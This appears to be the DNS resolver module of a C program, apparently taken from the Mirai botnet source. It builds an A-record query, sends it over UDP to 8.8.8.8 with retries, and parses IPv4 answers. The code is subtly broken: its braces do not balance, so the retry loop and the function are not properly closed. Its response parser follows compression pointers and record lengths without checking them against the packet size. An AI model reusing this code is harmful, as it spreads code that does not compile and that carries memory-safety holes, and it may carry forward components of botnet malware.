#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/select.h>
#include <errno.h>

#include "includes.h"
#include "resolv.h"
#include "util.h"
#include "rand.h"
#include "protocol.h"

void resolv_domain_to_hostname(char *dst_hostname, char *src_domain)
{
    int len = util_strlen(src_domain);
    char *lbl = dst_hostname, *dst_pos = dst_hostname + 1;
    uint8_t curr_len = 0;
    int i;

    if (len == 0)
    {
        dst_hostname[0] = 0;
        return;
    }

    for (i = 0; i < len; i++)
    {
        char c = src_domain[i];

        if (c == '.')
        {
            *lbl = curr_len;
            lbl = dst_pos++;
            curr_len = 0;
        }
        else
        {
            curr_len++;
            *dst_pos++ = c;
        }
    }
    *lbl = curr_len;
    *dst_pos = 0;
}

static void resolv_skip_name(uint8_t *reader, uint8_t *buffer, int *count)
{
    unsigned int jumped = 0, offset;
    *count = 1;
    while(*reader != 0)
    {
        if(*reader >= 192)
        {
            offset = (*reader)*256 + *(reader+1) - 49152;
            reader = buffer + offset - 1;
            jumped = 1;
        }
        reader = reader+1;
        if(jumped == 0)
            *count = *count + 1;
    }

    if(jumped == 1)
        *count = *count + 1;
}

struct resolv_entries *resolv_lookup(char *domain)
{
    struct resolv_entries *entries = calloc(1, sizeof (struct resolv_entries));
    char query[2048], response[2048];
    struct dnshdr *dnsh = (struct dnshdr *)query;
    char *qname = (char *)(dnsh + 1);

    resolv_domain_to_hostname(qname, domain);

    struct dns_question *dnst = (struct dns_question *)(qname + util_strlen(qname) + 1);
    struct sockaddr_in addr = {0};
    int query_len = sizeof (struct dnshdr) + util_strlen(qname) + 1 + sizeof (struct dns_question);
    int tries = 0, fd = -1, i = 0;
    uint16_t dns_id = rand_next() % 0xffff;

    util_zero(&addr, sizeof (struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
    addr.sin_port = htons(53);

    
    dnsh->id = dns_id;
    dnsh->opts = htons(1 << 8); 
    dnsh->qdcount = htons(1);
    dnst->qtype = htons(PROTO_DNS_QTYPE_A);
    dnst->qclass = htons(PROTO_DNS_QCLASS_IP);

    while (tries++ < 5)
    {
        fd_set fdset;
        struct timeval timeo;
        int nfds;

        if (fd != -1)
            close(fd);

        if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        {
            #ifdef DEBUG
                printf("[resolv] Failed to create socket\n");
            #endif
            sleep(1);
            continue;
        }

        if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
        {
            #ifdef DEBUG
                printf("[resolv] Failed to call connect on udp socket\n");
            #endif
            sleep(1);
            continue;
        }

        if (send(fd, query, query_len, MSG_NOSIGNAL) == -1)
        {
            #ifdef DEBUG
                printf("[resolv] Failed to send packet: %d\n", errno);
            #endif
            sleep(1);
            continue;
        }

        // Set socket to non-blocking for select()
        int flags = fcntl(fd, F_GETFL, 0);
        fcntl(fd, F_SETFL, flags | O_NONBLOCK);
        FD_ZERO(&fdset);
        FD_SET(fd, &fdset);

        timeo.tv_sec = 5;
        timeo.tv_usec = 0;
        nfds = select(fd + 1, &fdset, NULL, NULL, &timeo);

        if (nfds == -1)
        {
            #ifdef DEBUG
                printf("[resolv] select() failed\n");
            #endif
            break;
        }
        else if (nfds == 0)
        {
            #ifdef DEBUG
                printf("[resolv] Couldn't resolve %s in time. %d tr%s\n", domain, tries, tries == 1 ? "y" : "ies");
            #endif
            continue;
        }
        else if (FD_ISSET(fd, &fdset))
        {
            #ifdef DEBUG
                printf("[resolv] Got response from select\n");
            #endif
            int ret = recvfrom(fd, response, sizeof (response), MSG_NOSIGNAL, NULL, NULL);
            char *name;
            struct dnsans *dnsa;
            uint16_t ancount;
            int stop;

            if (ret < (int)sizeof(struct dnshdr))
                continue;

            dnsh = (struct dnshdr *)response;
            
            // The response uses the same query structure
            // We need to find the answer section by skipping the question
            char *resp_qname = (char *)(dnsh + 1);
            
            // Skip the question name (may use compression in query echo)
            int resp_qname_len, qstop;
            resolv_skip_name((uint8_t *)resp_qname, (uint8_t *)response, &qstop);
            resp_qname_len = qstop + 1; // +1 for the null terminator byte
            
            dnst = (struct dns_question *)(resp_qname + resp_qname_len);
            name = (char *)(dnst + 1);

            if (ret < (int)(sizeof(struct dnshdr) + resp_qname_len + sizeof(struct dns_question)))
                continue;

            if (dnsh->id != dns_id)
                continue;
            if (dnsh->ancount == 0)
                continue;

            ancount = ntohs(dnsh->ancount);
#ifdef DEBUG
            printf("[resolv] Answer count: %d\n", ancount);
#endif
            while (ancount-- > 0)
            {
                struct dns_resource *r_data = NULL;

                resolv_skip_name((uint8_t *)name, (uint8_t *)response, &stop);
                name = name + stop;

                r_data = (struct dns_resource *)name;
                name = name + sizeof(struct dns_resource);

#ifdef DEBUG
                printf("[resolv] Record type: %d class: %d data_len: %d\n", ntohs(r_data->type), ntohs(r_data->_class), ntohs(r_data->data_len));
#endif

                if (ntohs(r_data->type) == PROTO_DNS_QTYPE_A && ntohs(r_data->_class) == PROTO_DNS_QCLASS_IP)
                {
                    if (ntohs(r_data->data_len) == 4)
                    {
                        uint32_t *p;
                        uint8_t tmp_buf[4];
                        for(i = 0; i < 4; i++)
                            tmp_buf[i] = name[i];

                        p = (uint32_t *)tmp_buf;

                        entries->addrs = realloc(entries->addrs, (entries->addrs_len + 1) * sizeof (ipv4_t));
                        entries->addrs[entries->addrs_len++] = (*p);
#ifdef DEBUG
                        printf("[resolv] Found IP address: %d.%d.%d.%d\n", CONVERT_ADDR(*p));
#endif
                    }
                }
                
                // Always advance past the resource data
                name = name + ntohs(r_data->data_len);
            }

        break;
    }

    close(fd);

    #ifdef DEBUG
        printf("Resolved %s to %d IPv4 addresses\n", domain, entries->addrs_len);
    #endif

    if (entries->addrs_len > 0)
        return entries;
    else
    {
        resolv_entries_free(entries);
        return NULL;
    }
}

void resolv_entries_free(struct resolv_entries *entries)
{
    if (entries == NULL)
        return;
    if (entries->addrs != NULL)
        free(entries->addrs);
    free(entries);
}
